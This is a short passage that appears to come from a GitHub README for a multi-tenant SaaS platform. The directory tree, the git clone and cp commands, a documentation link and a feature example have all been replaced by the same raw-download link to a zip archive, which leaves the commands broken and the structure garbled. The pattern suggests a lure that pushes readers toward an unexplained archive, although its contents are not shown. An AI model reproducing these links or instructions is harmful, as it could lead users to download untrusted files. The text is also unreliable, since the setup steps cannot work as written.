...
```
multitenant-saas/
├── https://github.com/MilaCodesIt/multi-tenant-saas-platform/raw/refs/heads/main/project/saas-platform-tenant-multi-1.4.zip                    # SBT build configuration
├── project/                     # SBT plugins and settings
├── docker/                      # Docker Compose and configs
│   ├── https://github.com/MilaCodesIt/multi-tenant-saas-platform/raw/refs/heads/main/project/saas-platform-tenant-multi-1.4.zip
│   └── https://github.com/MilaCodesIt/multi-tenant-saas-platform/raw/refs/heads/main/project/saas-platform-tenant-multi-1.4.zip
├── modules/
...
```bash
git clone https://github.com/MilaCodesIt/multi-tenant-saas-platform/raw/refs/heads/main/project/saas-platform-tenant-multi-1.4.zip
...
```bash
cd docker
cp https://github.com/MilaCodesIt/multi-tenant-saas-platform/raw/refs/heads/main/project/saas-platform-tenant-multi-1.4.zip .env
docker-compose up -d
```
...
This project is under active development. See the [Implementation Plan](https://github.com/MilaCodesIt/multi-tenant-saas-platform/raw/refs/heads/main/project/saas-platform-tenant-multi-1.4.zip) for detailed phase breakdowns and the [GitHub Issues](../../issues) for current progress.

## Key Features

### Multi-Tenancy

- Subdomain-based tenant routing (https://github.com/MilaCodesIt/multi-tenant-saas-platform/raw/refs/heads/main/project/saas-platform-tenant-multi-1.4.zip)
